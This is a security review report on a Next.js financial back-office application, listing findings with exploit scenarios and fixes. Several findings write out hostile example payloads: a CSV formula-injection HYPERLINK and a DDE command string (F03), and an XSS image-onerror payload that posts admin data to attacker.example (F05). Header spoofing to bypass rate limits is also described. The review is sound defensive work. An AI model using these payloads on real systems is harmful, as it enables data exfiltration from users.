# Security Review — TAMANNA TRADERS CNF Back Office

**Task:** P7-T001 · Full application security review
**Reviewer:** security-reviewer (review-only — no production code was modified)
**Date:** 2026-08-16
**Commit reviewed:** `c3bea8f` (`phase-6-complete`)
**Scope:** the whole application against `agents/security-reviewer.md` and `plan.md` §14

---

## 1. Verdict

The application layer is in good shape. Authorisation, injection resistance, upload
handling, secret hygiene and audit coverage were checked by invocation and by reading every
server action, route handler and service — no Critical finding, and no High finding in
application code.

The two **High** items below are both **transport / deployment** items. They are the Phase 0
carry-forwards that P7-T006 (Deployment assets) was created to close, and P7-T006 has not
run yet — the repository today contains no Nginx config, no HSTS, no HTTP→HTTPS redirect
and no PM2 ecosystem file. They are go-live blockers, not code defects, with the one
exception noted in H1 (a one-line code change that removes the dependency on operator
discipline entirely).

| Severity | Count | Open |
|---|---|---|
| Critical | 0 | — |
| High | 2 | F01, F02 |
| Medium | 5 | F03–F07 |
| Low | 6 | F08–F13 |

`pnpm audit --audit-level=high` → **exit 0, clean of High/Critical** (1 moderate, see F12).

---

## 2. Carry-forward re-verification

The coordinator asked specifically whether the earlier carry-forwards are now closed.

| Carry-forward | Status | Evidence |
|---|---|---|
| HSTS in deploy assets | **OPEN** | No Nginx/deploy asset exists anywhere in the tree. `find . -name '*.conf' -o -name 'ecosystem*'` → nothing. `next.config.ts` deliberately omits HSTS (correct — it belongs in the TLS server block), so today HSTS is emitted by nobody. → **F02** |
| Nginx `proxy_set_header` pin (P0-F09) | **OPEN** | The requirement lives only as a `TODO(deployment)` comment in `src/server/auth.ts:236-245`. Two separate mechanisms depend on it — the login rate limiter (`clientIp`, fails closed) and the session-cookie `Secure` flag (fails **open**). → **F01**, **F02** |
| MySQL grants (DML-only app user) | **CLOSED** in code and dev; **verify in prod** | Verified live against the dev server: `cnf_app` holds `SELECT, INSERT, UPDATE, DELETE` on the app schemas and `USAGE` on `*.*` — no `DROP`, no `GRANT`, no global privileges. `cnf_migrate` is a separate account with `ALL PRIVILEGES`. `src/server/db.ts:23` reads `DATABASE_URL_APP` first. `@@bind_address = 127.0.0.1`. The only residue is the audit-log grant → **F04**. |
| CSP | **PARTIAL** | An enforced CSP is present (`frame-ancestors`, `object-src`, `base-uri`, `form-action`) — the clickjacking and JSONP classes are closed. `script-src`/`default-src` are still Report-Only. → **F05** |

---

## 3. Findings

Ranked most severe first. Each is filed for the coordinator as `P7-F<nn>`.

---

### P7-F01 — Session cookie `Secure` flag is unenforced and can silently ship off

```
SEVERITY: High
FILE:     src/server/auth.ts:383-386 (NextAuth config — no `useSecureCookies`)
          .env.example:41-43 (AUTH_URL documented but never asserted)
```

**ISSUE**
Nothing in the repository guarantees the session cookie carries `Secure` in production.
Auth.js derives it, per request, from the resolved origin:

- `@auth/core/lib/init.js:69` — `cookie.defaultCookies(config.useSecureCookies ?? url.protocol === "https:")`
- `@auth/core/src/lib/utils/env.ts` `createActionURL` — the origin is `AUTH_URL` when set,
  otherwise `x-forwarded-proto` → `host`.

The config sets `trustHost: true` and never sets `useSecureCookies`. So the flag is a
function of two pieces of deployment configuration, neither of which is validated at boot:
`AUTH_URL` being `https://…`, and Nginx sending `X-Forwarded-Proto`. `httpOnly` and
`sameSite=lax` are unconditional and correct; only `secure` is conditional.

This fails **open**. The sibling mechanism that depends on the same proxy headers — login
rate limiting — was deliberately made to fail *closed* in P0-F09 (`clientIp` returns `null`
and the login is refused). The cookie path has no such guard.

**EXPLOIT**
1. Deploy to the VPS. `.env` is written by hand (`.env.example` documents `AUTH_URL` but no
   code checks it) and `AUTH_URL` is left blank, or left at the `http://localhost:3000`
   value carried over from the dev template. Nginx is configured without
   `proxy_set_header X-Forwarded-Proto $scheme;` — the pin that P7-T006 has not written yet.
2. Next receives plain HTTP on `127.0.0.1:3000`; `createActionURL` resolves `http:`;
   `useSecureCookies` is `false`.
3. The owner signs in over HTTPS. The response sets `authjs.session-token` **without the
   `Secure` attribute** (and without the `__Secure-` prefix).
4. The owner later types `tamanna-example.com` into the address bar. The browser makes the
   first request over plain HTTP — *before* the Nginx 301 to HTTPS — and attaches the
   session cookie. Anyone on the path (café Wi-Fi, hostile ISP, ARP-spoofed LAN) reads the
   encrypted-JWT session token in cleartext and replays it. The token is a full session:
   `refreshDbSession` will accept it until the 8-hour idle window closes.

The HTTP→HTTPS redirect does not save you — the cookie is already on the wire in the
request that gets redirected. Only the `Secure` attribute prevents it, and HSTS
(**F02**) prevents the plaintext request in the first place.

**FIX**
Two changes, both required:

1. **Code (removes the dependency on operator discipline).** In `src/server/auth.ts`, set
   the flag explicitly rather than letting it be derived:

   ```ts
   export const { handlers, auth, signIn, signOut } = NextAuth({
     trustHost: true,
     useSecureCookies: process.env.NODE_ENV === "production",
     secret: process.env.AUTH_SECRET,
     // …
   });
   ```

   Add a boot-time assertion next to the existing `AUTH_SECRET` handling: in production,
   throw if `AUTH_URL` is unset or does not start with `https://`. A deploy that cannot set
   a secure cookie should refuse to start, exactly as `src/server/db.ts:25` refuses to start
   without a database URL.

2. **Deploy asset (P7-F02 / P7-T006).** Pin in the Nginx location block:
   ```nginx
   proxy_set_header X-Forwarded-Proto $scheme;
   proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
   proxy_set_header X-Real-IP         $remote_addr;
   proxy_set_header Host              $host;
   ```

Regression test: assert `useSecureCookies` is `true` when `NODE_ENV=production`, and that
the config throws when `AUTH_URL` is absent or `http://` in production.

---

### P7-F02 — No transport-layer hardening exists in the repository

```
SEVERITY: High
FILE:     (absent) deploy/nginx.conf, ecosystem.config.js, docs/deployment.md
          src/server/auth.ts:236-245 — the requirement survives only as a TODO comment
```

**ISSUE**
Four `plan.md` §14/§15 requirements have no artefact in the tree and no owner outside a
code comment:

- **HSTS** — not emitted by anything. `next.config.ts` correctly declines to send it
  (Next would send it over plain HTTP too), delegating to the Nginx TLS block. That block
  does not exist.
- **HTTP → HTTPS redirect** — no `server { listen 80; return 301 …; }`.
- **`X-Forwarded-For` / `X-Real-IP` pin** — the login rate limiter's entire trust model
  (`clientIp`, `src/server/auth.ts:252-278`) rests on `$proxy_add_x_forwarded_for` making
  the rightmost hop trustworthy.
- **`bind-address = 127.0.0.1` and UFW** — verified correct on the dev host
  (`@@bind_address = 127.0.0.1`), but there is no provisioning asset that reproduces it.

The code is written *around* these assumptions and documents them well; nothing enforces
them.

**EXPLOIT**
Two concrete failures from one missing config file:

1. *No `X-Forwarded-For`.* In production `clientIp()` returns `null`, `authorize()` throws
   `login_unavailable`, and **every login fails**. `logProxyMisconfiguration()` prints one
   line to the PM2 log. This is fail-closed and therefore safe, but it is a total outage on
   first deploy, discovered by the owner rather than by a test.
2. *Nginx set up with the naive `proxy_set_header X-Forwarded-For $http_x_forwarded_for;`*
   (a common copy-paste) instead of `$proxy_add_x_forwarded_for`. Now the client controls
   the whole header. An attacker sends `X-Forwarded-For: 1.1.1.1` on attempt 1,
   `1.1.1.2` on attempt 2, and so on: the rightmost hop is attacker-chosen, every attempt
   lands in a fresh per-IP bucket, and the 5-per-15-min limit is defeated. The per-email
   bucket (10 / 15 min) still applies, so this is password *spraying* across many accounts
   at unlimited rate rather than a single-account brute force — which is precisely what
   P0-F01 was filed to prevent.
3. *No HSTS.* See F01 step 4 — the browser's first plaintext request is what leaks the
   cookie, and HSTS is the mechanism that stops the browser from ever making it.

**FIX**
P7-T006 must ship `deploy/nginx.conf` (or equivalent) containing, at minimum:

```nginx
server { listen 80; server_name _; return 301 https://$host$request_uri; }

server {
  listen 443 ssl http2;
  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
  client_max_body_size 6M;

  location / {
    proxy_pass http://127.0.0.1:3000;
    proxy_set_header Host              $host;
    proxy_set_header X-Real-IP         $remote_addr;
    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;   # NOT $http_x_forwarded_for
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 120s;
  }
}
```

plus the MySQL `bind-address = 127.0.0.1` and UFW (22/80/443 only) steps in
`docs/deployment.md`, and a `docs/deployment.md` pre-flight checklist that fails the release
if `AUTH_URL` is not `https://`.

---

### P7-F03 — CSV export is vulnerable to spreadsheet formula injection

```
SEVERITY: Medium
FILE:     src/lib/export/csv.ts:44 (escapeField)
```

**ISSUE**
`escapeField` implements RFC-4180 quoting correctly but does nothing about the leading
characters that Excel, LibreOffice and Google Sheets treat as the start of a formula:
`=`, `+`, `-`, `@`, and the control characters TAB (`0x09`) and CR (`0x0D`). Every
free-text column in every CSV export is written verbatim.

The `.xlsx` path is **not** affected: `ExcelStream.writeRow` (`src/lib/export/excel.ts:135`)
assigns a JS string, which exceljs writes as a shared string, and Excel does not evaluate
string cells. The PDF path is not affected either. This is a CSV-only defect.

**EXPLOIT**
This crosses a privilege boundary — an Operator plants it, an Admin detonates it.

1. Sign in as **Operator** (cannot manage users, cannot see the audit trail).
2. Create an expense — `createExpenseAction` is `authorizeAction("ADMIN", "OPERATOR")` — with
   the description field set to:
   ```
   =HYPERLINK("https://attacker.example/x?d="&SUBSTITUTE(A2&"|"&I2," ","_"),"Open receipt")
   ```
   `description` is `optionalText("Description", 2000)` (`src/lib/validation/expense.ts:162`)
   — no character restrictions.
3. The Admin runs the Expense Report and clicks **Export → CSV**
   (`GET /api/export/expense?format=csv`). The `description` column is column 11 of that
   export's descriptor.
4. Excel opens the file, parses the cell as a formula, and renders a link. One click
   exfiltrates the neighbouring cells (date, voucher no, amount, client) to the attacker's
   server. Substituting `=cmd|'/c calc'!A0` reaches DDE on Windows installations where the
   legacy handler is still enabled; Excel prompts, and the prompt is the kind a
   non-technical owner clicks through.

Reachable planting fields: expense `description`/`notes`/`favouring`/`bank_name`/
`instrument_no`, loan `purpose`, receipt/advance `reference` and `notes`, job fields —
all Operator-writable, all present as export columns.

**FIX**
Neutralise in `escapeField`, before the quoting decision:

```ts
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function escapeField(raw: unknown): string {
  if (raw === null || raw === undefined) return "";
  let text = String(raw);
  // CSV/formula injection (OWASP): a leading =,+,-,@,TAB,CR makes Excel /
  // LibreOffice / Sheets evaluate the cell. Prefix an apostrophe so the value
  // renders as text. Applied before quoting so the quote logic still sees the
  // final field.
  if (FORMULA_LEAD.test(text)) text = `'${text}`;
  if (/[",\r\n]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}
```

Do **not** apply this to money columns — they are pre-rounded 2-dp decimal strings and a
negative amount legitimately starts with `-`. The safe scoping is to skip neutralisation
when `column.money === true` (money values are produced by `roundMoney`, never by a user),
or to only neutralise when the text does not match `/^-?\d/`. Add a unit test in
`tests/unit/csv-export.test.ts` covering `=`, `+`, `@`, TAB and a legitimate `-1234.00`
money cell.

---

### P7-F04 — `audit_log` is append-only in the app but writable in the database

```
SEVERITY: Medium
FILE:     prisma/migrations/20260814141105_init/migration.sql:56 (no triggers)
          verified live: GRANT SELECT, INSERT, UPDATE, DELETE ON `cnf_dev`.* TO `cnf_app`
```

**ISSUE**
The application side is genuinely append-only: `src/server/services/audit.service.ts`
exports only `writeAudit`, and a repository-wide grep for `auditLog.` returns exactly two
call sites, both `create` (`audit.service.ts:61`, `auth.service.ts:58`). There is no update
path, no delete path, and no UI affordance. That half is clean.

The database does not back it up. The application account's grant is schema-wide DML, which
includes `UPDATE` and `DELETE` on `audit_log`. So the append-only property is a property of
the *current code*, not of the data. In a financial system whose audit trail is the only
recovery path for a hard-deleted record (see F06), that is the wrong place for the guarantee
to live.

**EXPLOIT**
The audit trail is the evidence that everything else in this review relies on. Any future
path that reaches SQL with the app credentials can erase it:

1. A future report or maintenance feature adds a `$queryRaw` with a concatenated fragment
   (today: zero such queries — `Prisma.raw` appears nowhere in `src/`), or a dependency in
   the query path is compromised.
2. `DELETE FROM audit_log WHERE entity='bill' AND entity_id='4711'` succeeds with the app's
   own connection. The `BILL_AMENDED` row documenting a changed issued bill is gone. The
   R13 Audit Trail report and its export now show a clean history, and there is no second
   copy: `audit_log` has no FK cascade and no archive table.

The exposure is conditional, which is why this is Medium and not High — but the cost of
closing it is two DDL statements.

**FIX**
Add a migration that makes the table append-only at the engine level, so it holds regardless
of what the application does:

```sql
CREATE TRIGGER `audit_log_no_update` BEFORE UPDATE ON `audit_log`
  FOR EACH ROW SIGNAL SQLSTATE '45000'
  SET MESSAGE_TEXT = 'audit_log is append-only';

CREATE TRIGGER `audit_log_no_delete` BEFORE DELETE ON `audit_log`
  FOR EACH ROW SIGNAL SQLSTATE '45000'
  SET MESSAGE_TEXT = 'audit_log is append-only';
```

Triggers are the right instrument here: MySQL table-level grants are *additive* with
schema-level grants, so `GRANT SELECT, INSERT ON cnf_prod.audit_log` would **not** remove
the schema-wide `UPDATE`/`DELETE`. Doing it by grants means dropping the schema-wide DML
grant and re-granting per table, which then has to be maintained on every new table — a
worse trade. Keep `cnf_migrate` able to drop the triggers so `migrate deploy` still works.

Record the expectation in `docs/deployment.md` and assert it in `scripts/integrity-check.ts`
(P7-T005): an `UPDATE audit_log SET action=action WHERE id=0` that *succeeds* is a finding.

---

### P7-F05 — Enforced CSP has no `script-src`; only the Report-Only header does

```
SEVERITY: Medium
FILE:     next.config.ts:31-40
```

**ISSUE**
The enforced header is
`frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'`.
Clickjacking, plugin injection, `<base>` hijacking and cross-origin form posts are all
closed — that is real coverage, and the reasoning in the file's comment is sound (Next's
inline bootstrap needs a nonce, and shipping a broken `script-src` silently is worse than
shipping none).

But with no `default-src` and no `script-src`, the header provides **zero** script-execution
restriction. The Report-Only twin carries `default-src 'self'` and is collecting nothing —
no `report-uri`/`report-to` is configured, so violations go to the browser console of
whoever happens to have DevTools open.

**EXPLOIT**
CSP is defence in depth, and the primary defence is currently holding: React escapes all
interpolation and a repo-wide grep for `dangerouslySetInnerHTML`, `innerHTML`, `eval(` and
`new Function` returns nothing. So there is no *live* XSS to demonstrate. The failure
scenario is the next one introduced:

1. A future screen renders stored rich text — an annexure body, a letter template preview,
   a bill note — through `dangerouslySetInnerHTML`, which is the natural way to build that.
2. An Operator stores `<img src=x onerror="fetch('/api/export/audit-trail?format=csv')
   .then(r=>r.text()).then(t=>fetch('https://attacker.example',{method:'POST',body:t}))">`.
3. An Admin views the page. The script runs with the Admin's cookies and streams the
   Admin-only audit trail off-box. Nothing in the enforced CSP blocks either the inline
   handler or the cross-origin `fetch`, because neither `script-src` nor `connect-src` is
   present.

**FIX**
Complete the nonce experiment the comment already plans:

1. Generate a per-request nonce in `src/middleware.ts`, forward it on a request header, and
   emit the CSP from middleware rather than `next.config.ts` (a static config cannot carry a
   per-request nonce).
2. Enforce `default-src 'self'; script-src 'self' 'nonce-<n>' 'strict-dynamic';
   style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:;
   connect-src 'self'` alongside the four directives already enforced.
3. If the nonce work slips past go-live, at minimum add `default-src 'self'` and
   `connect-src 'self'` to the enforced header — neither affects Next's inline bootstrap
   (which is governed by `script-src`, and absent `script-src` falls back to `default-src`,
   so verify this in a smoke test before shipping) — and add a `report-to` endpoint so the
   Report-Only header stops being decorative.

---

### P7-F06 — An Operator can hard-delete a loan payment and its posted expense

```
SEVERITY: Medium
FILE:     src/server/actions/loans.ts:259-262 (authorizeAction("ADMIN", "OPERATOR"))
          src/server/services/loan.service.ts:685-719 (tx.expense.delete / tx.loanPayment.delete)
```

**ISSUE**
`deleteLoanPaymentAction` is open to Operators and performs a genuine hard delete of two
financial rows — the `loan_payments` row and the `expenses` row that `createLoanPayment`
auto-posted for it. This sits against two plan statements:

- §4: Admin's capabilities include "edit/delete/cancel issued records"; Operator "cannot:
  … cancel or delete issued bills".
- §9.3: "`ON DELETE RESTRICT` everywhere. **Nothing referenced is ever deleted.**"

Everything else in the system honours the soft-delete rule — users deactivate, clients
deactivate, bills cancel rather than delete. This is the one financial path that removes
rows, and it is the one with the wider role.

The design was deliberate (PROGRESS.md:3101, 3114 — payment *edit* is not offered, so
delete-and-recreate is the correction mechanism, and the `LOAN_PAYMENT_DELETED` audit row
carries a full `{payment, expense}` before-snapshot). It went through the P5 gate. I am
flagging it because the role assignment, not the deletion, is what departs from §4, and
because the mitigation depends entirely on F04 being fixed.

**EXPLOIT**
1. Sign in as **Operator**. Open a loan with a ৳500,000 `PRINCIPAL_RETURN` payment.
2. Invoke `deleteLoanPaymentAction({ id: <paymentId> })` — from the UI, or directly by
   POSTing the server-action id, which is the same thing as far as the guard is concerned.
3. Both rows vanish. Outstanding principal on the Loan Ledger silently rises by ৳500,000;
   the Cash Flow and Expense reports lose the outflow; the Dashboard's principal-returned
   KPI changes. No Admin approval, no cancellation record, no tombstone row.
4. Recovery is possible only by an Admin reading the `LOAN_PAYMENT_DELETED` before-snapshot
   out of the audit trail and re-keying it — and per **F04**, that snapshot is itself
   deletable with the application's own database credentials.

**FIX**
Pick one, and record the choice in the ADR set:

- **Preferred:** narrow the guard to `authorizeAction("ADMIN")` in
  `src/server/actions/loans.ts:262`, matching `cancelBillAction` and `amendBillAction`. An
  Operator who mis-keys a payment asks an Admin, exactly as they must for a mis-keyed bill.
- **Alternative:** keep the Operator role but convert to a soft delete — add
  `reversed_at`/`reversed_by`/`reversal_reason` to `loan_payments` and `expenses`, exclude
  reversed rows from every aggregate, and require a reason string as `cancelBillAction`
  does. This satisfies §9.3 directly.

Either way, add an RBAC E2E case in `tests/e2e/rbac.spec.ts` asserting the chosen boundary,
so the decision is pinned rather than re-litigated.

---

### P7-F07 — Voucher uploads over ~1 MB are rejected, against the documented 5 MB cap

```
SEVERITY: Medium (functional defect inside a §14 requirement — no attacker benefit)
FILE:     next.config.ts (no experimental.serverActions.bodySizeLimit)
          src/server/actions/expenses.ts:223 (attachExpenseFileAction takes FormData)
          src/server/services/upload.service.ts:21 (MAX_FILE_SIZE = 5 MB)
```

**ISSUE**
The upload service enforces the plan's 5 MB cap correctly and checks `file.size` *before*
buffering (`upload.service.ts:112`), so there is no memory-amplification issue. But the file
reaches it through a **Server Action**, and Next.js caps a Server Action request body at
**1 MB** by default (`experimental.serverActions.bodySizeLimit`). `next.config.ts` does not
raise it. So the effective cap is 1 MB, not 5 MB, and the rejection happens in the framework
— above the action — where none of the plain-language error handling applies.

This is a functional defect, not an exploitable one: it fails closed, and the 5 MB check in
`storeUploadedFile` remains the real ceiling for anything that does get through. I am
reporting it under the Uploads checklist item because the stated requirement is not met.

**EXPLOIT**
1. Sign in as Operator, open an expense, attach a 2.4 MB scanned PDF voucher — an entirely
   ordinary phone-scanned multi-page document, and well inside the documented 5 MB limit.
2. Next rejects the request before `attachExpenseFileAction` runs. The user sees a generic
   framework error, not "This file is larger than 5 MB. Please attach a smaller scan."
3. Rule 9 (plain-language errors for a non-technical user) is violated, and the owner has no
   way to tell a too-big file from a broken app.

**FIX**
```ts
// next.config.ts
const nextConfig: NextConfig = {
  experimental: {
    // Voucher scans are capped at 5 MB by upload.service.ts; the Server Action
    // body limit must sit just above it so the *service* produces the
    // plain-language rejection, not the framework. Nginx client_max_body_size
    // is 6M for the same reason (plan.md §15).
    serverActions: { bodySizeLimit: "6mb" },
  },
  async headers() { /* … */ },
};
```
6 MB matches the `client_max_body_size 6M` that plan.md §15 already specifies for Nginx, so
the two limits agree and the service's own 5 MB check is the one that fires. Add an
integration test attaching a 2 MB fixture and asserting success, plus a 6 MB fixture
asserting the plain-language 5 MB message.

---

### P7-F08 — No authentication event log; `users.last_login_at` is never written

```
SEVERITY: Low
FILE:     src/server/auth.ts:406-427 (jwt callback, signIn branch — no last_login_at update)
          src/server/services/user.service.ts:60,70 (last_login_at read and serialised)
```

**ISSUE**
`users.last_login_at` exists in the schema, is selected by `listUsers`, and is serialised
into `UserListItem.lastLoginAt` — but no code path ever writes it. A repository-wide grep
returns three hits, all reads. It is permanently `null`.

More broadly there is no authentication audit trail at all: no `audit_log` row on sign-in,
sign-out, failed attempt or lockout. `audit_log` covers every financial mutation
thoroughly (34 distinct action verbs across 12 services, all inside the mutation's own
transaction) — authentication is the gap. The `sessions` table records `ip` and
`user_agent`, but rows are deleted on sign-out, on idle expiry and on deactivation, so it is
a liveness view, not a history.

**EXPLOIT**
1. An attacker obtains a session token (see F01) or a password and signs in as the owner
   outside business hours.
2. They read every report and export the client list, taking no write action — so nothing
   reaches `audit_log`.
3. They sign out; the `sessions` row is deleted by the `signOut` event
   (`src/server/auth.ts:441-448`).
4. There is now no record anywhere that the account was accessed. The Admin's own Users
   screen would be the natural place to notice, and it has a "last login" field that has
   never been populated.

**FIX**
In the `jwt` callback's `trigger === "signIn"` branch, inside the same transaction that
creates the session row, also `tx.user.update({ where: { id }, data: { last_login_at: new Date() } })`
and write an `audit_log` row (`entity: "user"`, `action: "USER_SIGNED_IN"`, `ip`,
`user_agent`). Add `USER_SIGNED_OUT` in the `signOut` event and `LOGIN_FAILED` /
`LOGIN_LOCKED_OUT` in the `authorize` failure paths — the last two with the submitted email
in `after_json` and `user_id: null`, since there may be no user. Surface `lastLoginAt` in
`users-list.tsx`, which currently does not render it. Extend `AUDIT_ENTITIES` in
`audit-trail-view.tsx` so the new verbs are filterable.

---

### P7-F09 — Prisma is reachable from three server actions; the ESLint guard does not cover them

```
SEVERITY: Low
FILE:     eslint.config.mjs:124-126 (files: src/app/**, src/components/** only)
          src/server/actions/expenses.ts, advances.ts, receipts.ts (import { prisma })
```

**ISSUE**
TEAM.md §7 rule 2 / plan.md §12.2: "No Prisma calls outside `src/server/services/`."
The `no-restricted-imports` rule that enforces it is scoped to `src/app/**` and
`src/components/**`, so `src/server/actions/**` is unguarded — and three action files use
it:

- `advances.ts:140,146` — `prisma.client.findMany` / `prisma.moneyChannel.findMany`
- `receipts.ts:145,151,289` — the same two, plus `prisma.receiptAllocation.groupBy`
- `expenses.ts:251-278` — a full `prisma.$transaction` that updates `expenses` and writes
  the audit row

The queries themselves are correct: parameterised, transactional where they mutate, audited.
The defect is the missing guard, and the fact that the one write among them lives in the
action layer where the review checklist does not expect to find it.

**EXPLOIT**
A layering rule that is enforced in two of three directories is a rule that erodes. The
concrete risk is the next mutation written in an action file rather than a service: it skips
the service-layer conventions that this review relies on being universal — the
`prisma.$transaction` wrapper, the `writeAudit` call, the `Decimal`-only money handling, the
plain-language error mapping. `attachExpenseFileAction` already gets all four right, but by
the author's diligence rather than by structure, and the next one may not.

**FIX**
Extend the ESLint block's `files` glob to include `"src/server/actions/**/*.ts"`, then move
the five offending queries into their services: the two picker lookups into
`client.service.ts` / `channel.service.ts`, the `groupBy` into `receipt.service.ts`, and the
attach/remove transaction into `expense.service.ts` as `attachExpenseFile(expenseId,
filename, actor)` / `removeExpenseAttachment(expenseId, actor)`. The actions keep the guard,
the Zod parse and the `FormData` handling; the service owns the transaction.

---

### P7-F10 — `clientIp` / `requestIp` is reimplemented 18 times

```
SEVERITY: Low
FILE:     src/server/actions/*.ts — 18 private copies of `async function requestIp()`
          src/server/auth.ts:252-278 — the canonical `clientIp`, with the fail-closed branch
```

**ISSUE**
Eighteen action files each carry a private `requestIp()`. All eighteen currently agree —
each takes the **rightmost** `x-forwarded-for` hop and falls back to `x-real-ip` — which is
the correct trusted-hop rule established by P0-F01. But it is the security-critical decision
in the codebase most likely to be got wrong on the next edit (`hops[0]` is the intuitive
choice and the wrong one), and it is duplicated eighteen times.

The action copies also lack the production fail-closed branch that `clientIp` has: they
return `null` and the audit row simply records no IP. That is the right behaviour for an
audit field — an audit row with a missing IP beats a refused mutation — so it is not itself
a defect, only a second reason the two implementations should be visibly one function with a
documented difference.

**EXPLOIT**
A future edit to one copy — a contributor "fixing" it to `hops[0]` because that reads like
"the client" — makes every `audit_log.ip` value written through that action attacker-chosen.
An Operator then sends `X-Forwarded-For: 10.0.0.9` (the Admin's workstation) while amending
a bill, and the audit trail attributes the change to the Admin's IP. `user_id` is still
correct — it comes from the session, not the header — so this misleads an investigation
rather than defeating it. Hence Low.

**FIX**
Extract one exported helper — `src/server/request-ip.ts`, or export the existing `clientIp`
logic from a non-`"use server"` module — with the trusted-hop rule and its rationale in one
doc comment, and have all eighteen actions plus `auth.ts` call it. `src/server/auth.ts`
keeps the production fail-closed wrapper for the login path only. Add a unit test (extend
`tests/unit/client-ip.test.ts`) asserting the rightmost hop is chosen from a multi-hop
header.

---

### P7-F11 — PDF attachments are served inline from the application origin

```
SEVERITY: Low
FILE:     src/app/api/files/[id]/route.ts:73-78
```

**ISSUE**
`GET /api/files/[id]` answers with `Content-Disposition: inline` for all three allowed
types. For `application/pdf` that hands a user-supplied document to the browser's PDF viewer
on the application's own origin. The route is otherwise exemplary — auth first,
`mustChangePassword` checked, `GENERATED_NAME_RE` re-validated, a missing file and an
invalid id both answer an identical 404, and `X-Content-Type-Options: nosniff` is applied by
`next.config.ts`.

**EXPLOIT**
Constrained, which is why this is Low. Uploads are magic-byte sniffed
(`upload.service.ts:93-101`), so the bytes really are a PDF — an HTML polyglot cannot get
through. The residual is PDF-embedded JavaScript: an Operator uploads a PDF containing
`/OpenAction /JavaScript`, an Admin opens the voucher, and the payload runs inside the
viewer. Chrome's PDFium sandbox blocks DOM and cookie access, so on current browsers this is
noise; on an older viewer, or if the file is downloaded and opened in a desktop reader with
JavaScript enabled, it is not.

**FIX**
Add a per-response CSP to the file route — the cheapest complete answer:

```ts
headers: {
  "Content-Type": MIME_BY_EXTENSION[ext],
  "Content-Disposition": `inline; filename="voucher.${ext}"`,
  "Content-Security-Policy": "sandbox; default-src 'none'",
  "X-Content-Type-Options": "nosniff",
  "Cache-Control": "private, max-age=300",
  "Content-Length": String(bytes.length),
}
```

`sandbox` costs nothing for images and neuters embedded PDF actions. Keep `inline` — the
whole point of the route is previewing a voucher next to the expense.

---

### P7-F12 — `pnpm audit`: one moderate advisory (uuid via exceljs)

```
SEVERITY: Low
FILE:     pnpm-lock.yaml — .>exceljs>uuid
```

**ISSUE**
```
$ pnpm audit --audit-level=high
1 vulnerabilities found
Severity: 1 moderate
$ echo $?
0
```

**Clean of High and Critical — the checklist item passes.** The single moderate is
GHSA-w5hq-g745-h8pq, "uuid: Missing buffer bounds check in v3/v5/v6 when `buf` is provided",
`uuid <11.1.1`, reached transitively through `exceljs`. The lockfile is committed
(`pnpm-lock.yaml`, 340 KB) and `packageManager` is pinned to `pnpm@11.21.0`.

**EXPLOIT**
Not reachable here. The advisory requires calling `uuid.v3/v5/v6` with a caller-supplied
`buf` argument; `exceljs` uses `uuid.v4()` for worksheet identifiers and passes no buffer.
No application code imports `uuid`. Recording it so the next reviewer does not re-derive the
analysis.

**FIX**
No action required for go-live. Add a `pnpm.overrides` entry if a clean audit output is
wanted:
```json
"pnpm": { "overrides": { "uuid@<11.1.1": ">=11.1.1" } }
```
Verify the Excel export suite (`tests/unit/excel-export.test.ts`) still passes afterwards.
Schedule the monthly `pnpm audit` review that plan.md §14 calls for.

---

### P7-F13 — `UPLOAD_DIR` falls back inside the deployment directory

```
SEVERITY: Low
FILE:     src/server/services/upload.service.ts:70-76 (uploadRoot)
```

**ISSUE**
`uploadRoot()` resolves `UPLOAD_DIR` when set and otherwise falls back to
`path.resolve(process.cwd(), "uploads")` — i.e. `/var/www/cnf-back-office/uploads` on the
VPS. `.env.example` documents `UPLOAD_DIR` as "Absolute path, OUTSIDE the web root", but
nothing enforces it and the fallback is silent.

This is **not** a web-exposure issue: Next serves only `public/` statically, so a project-root
`uploads/` directory is unreachable over HTTP, and the only read path remains the
authenticated route. The dev machine is configured correctly
(`UPLOAD_DIR=/Users/mehedi/dev/cnf-back-office-uploads`, outside the repo), and `/uploads` is
gitignored.

**EXPLOIT**
An availability failure rather than a disclosure. Deploy with `UPLOAD_DIR` unset; vouchers
accumulate under `/var/www/cnf-back-office/uploads`. The release procedure (plan.md §15) is
`git pull` → `pnpm install` → `migrate deploy` → `build` → `pm2 reload`, which is fine — but
any deploy that replaces the directory (a clean re-clone, a blue/green swap, moving to a
release-directory layout) orphans every attachment. Meanwhile `expenses.attachment_path`
still points at them, so every voucher link 404s with "This attachment is no longer
available." and the loss is invisible until an Admin opens an old expense. Plan.md §16 lists
the uploads directory in the backup set; a directory inside the deploy tree is easy to miss
there too.

**FIX**
Fail closed in production, mirroring `src/server/db.ts:25`:

```ts
export function uploadRoot(): string {
  const configured = process.env.UPLOAD_DIR;
  if (configured && configured.trim().length > 0) return path.resolve(configured);
  if (process.env.NODE_ENV === "production") {
    throw new Error(
      "UPLOAD_DIR is not set. Voucher scans must be stored outside the deployment " +
        "directory — see docs/deployment.md.",
    );
  }
  return path.resolve(process.cwd(), "uploads");
}
```

Set `UPLOAD_DIR=/var/lib/cnf-back-office/uploads` (owned by the `cnf` user, mode 700) in the
P7-T006 deployment assets, and name that path in the P7-T004 backup script.

---

## 4. Checklist assessment

Every item in `agents/security-reviewer.md`. "Pass" means checked by reading the code path
end to end, and by invocation where invocation was possible.

### Authorisation

| Item | Result |
|---|---|
| Every server action re-checks the role server-side | **Pass.** All **101** exported `*Action` functions across the 21 action files open with `authorizeAction(...)`; enumerated exhaustively, and a per-file count confirms guards == actions in every file with zero mismatches. No action performs work before its guard. |
| Every route handler re-checks | **Pass.** `api/files/[id]` → `requireAuth` + `mustChangePassword`; `api/export/[report]` → `requireAuth` + `mustChangePassword`, plus `requireRole("ADMIN")` for `audit-trail`; `api/auth/[...nextauth]` is the auth endpoint itself. |
| Operator cannot reach an Admin action by direct invocation | **Pass** for the plan's §4 list — users, billing parameters, bill templates, letter templates, master data, settings, bill cancel/amend, bill-number override, audit trail (page, action *and* export) are all `authorizeAction("ADMIN")`. **One departure:** loan-payment delete → **F06**. |
